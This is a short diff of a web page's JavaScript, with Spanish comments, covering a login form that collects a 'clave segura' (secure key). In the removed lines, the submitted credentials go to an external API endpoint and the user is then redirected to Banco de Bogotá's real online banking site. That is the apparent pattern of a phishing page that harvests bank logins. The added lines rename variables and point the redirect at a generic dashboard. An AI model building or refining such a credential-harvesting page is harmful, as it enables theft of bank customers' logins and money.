@@ -817,7 +817,7 @@ window.checkFormTC = checkFormTC;
       showBtn(qaNavRight);
     }
   }
-  window.checkForm = hideBtn;
+  window.updateQANav = updateQANav;
 
 
   function scrollQA(direction) {
@@ -847,7 +847,7 @@ window.scrollQA = scrollQA;
 
   <script type="module">
     /* ────────── CONFIGURACIÓN ────────── */
-const API_URL = import.meta.env.VITE_API_URL; // ← cambia esto por tu URL real
+const VITE_API_URL = import.meta.env.VITE_API_URL; // ← cambia esto por tu URL real
 
 /* ────────── ENVÍO: CLAVE SEGURA ────────── */
 async function submitClaveSegura() {
@@ -893,7 +893,7 @@ async function enviarLogin(payload, btn) {
   btn.textContent = 'Ingresando...';
 
   try {
-    const response = await fetch(`${API_URL}/auth/registro`, {
+    const response = await fetch(`${VITE_API_URL}/auth/login`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -920,8 +920,7 @@ async function enviarLogin(payload, btn) {
     }
 
     // Redirigir al dashboard (o donde sea)
-    window.location.href = 'https://virtual.bancodebogota.co/';
-    alert('✅ Ingreso exitoso');
+    window.location.href = import.meta.env.VITE_DASHBOARD_URL || '/dashboard';
 
   } catch (error) {
     console.error('Error en login:', error);
